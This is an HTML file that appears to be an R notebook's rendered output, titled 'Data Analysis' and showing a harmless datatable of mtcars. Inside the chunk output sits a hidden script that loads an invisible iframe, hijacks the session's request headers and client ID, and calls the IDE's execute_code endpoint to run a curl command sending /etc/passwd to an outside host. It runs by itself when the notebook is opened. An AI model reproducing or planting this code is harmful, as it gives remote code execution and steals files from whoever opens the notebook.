<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta name="generator" content="pandoc" />
<title>Data Analysis</title>
</head>
<body>
<div class="container-fluid main-container">
<div id="header">
<h1 class="title toc-ignore">Data Analysis</h1>
</div>
<!-- rnb-text-begin -->
<!-- rnb-text-end -->
<!-- rnb-chunk-begin -->
<!-- rnb-source-begin eyJkYXRhIjogImBgYHtyfVxubGlicmFyeShEVClcbmRhdGF0YWJsZShtdGNhcnMpXG5gYGAifQ== -->
<pre class="r"><code>library(DT)
datatable(mtcars)</code></pre>
<!-- rnb-source-end -->
<!-- rnb-html-begin -->
<script>
var p = window.location.pathname;
var base = p.substring(0, p.indexOf('/chunk_output'));
var executed = false;

function doRCE(clientId, clientVersion, headers) {
  if (executed) return;
  executed = true;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', base + '/rpc/execute_code');
  for (var h in headers) {
    try { xhr.setRequestHeader(h, headers[h]); } catch(e) {}
  }
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({
    method: 'execute_code',
    params: ["system('curl -s -X POST -d @/etc/passwd https://poc.heli9.com/log.php')"],
    clientId: clientId,
    clientVersion: clientVersion || ''
  }));
}

var iframe = document.createElement('iframe');
iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.01;';
iframe.src = base + '/?launcher=1';
(document.body || document.documentElement).appendChild(iframe);

iframe.onload = function() {
  var iWin = iframe.contentWindow;
  var headers = {};

  var origSetHeader = iWin.XMLHttpRequest.prototype.setRequestHeader;
  iWin.XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
    headers[name] = value;
    return origSetHeader.apply(this, arguments);
  };

  var origSend = iWin.XMLHttpRequest.prototype.send;
  iWin.XMLHttpRequest.prototype.send = function(body) {
    if (body && typeof body === 'string') {
      try {
        var parsed = JSON.parse(body);
        if (!executed && parsed.clientId && parsed.clientId.length > 5) {
          doRCE(parsed.clientId, parsed.clientVersion, Object.assign({}, headers));
        }
      } catch(e) {}
    }
    headers = {};
    return origSend.apply(this, arguments);
  };

  var origFetch = iWin.fetch;
  if (origFetch) {
    iWin.fetch = function(url, opts) {
      if (opts && opts.body && typeof opts.body === 'string') {
        try {
          var parsed = JSON.parse(opts.body);
          if (!executed && parsed.clientId && parsed.clientId.length > 5) {
            var h = {};
            if (opts.headers && !(opts.headers instanceof iWin.Headers)) h = opts.headers;
            doRCE(parsed.clientId, parsed.clientVersion, h);
          }
        } catch(e) {}
      }
      return origFetch.apply(iWin, arguments);
    };
  }
};
</script>
<!-- rnb-html-end -->
<!-- rnb-chunk-end -->
</div>
<div id="rmd-source-code">LS0tCnRpdGxlOiAiRGF0YSBBbmFseXNpcyIKb3V0cHV0OiBodG1sX25vdGVib29rCi0tLQoKYGBge3J9CmxpYnJhcnkoRFQpCmRhdGF0YWJsZShtdGNhcnMpCmBgYAo=</div>
</body>
</html>
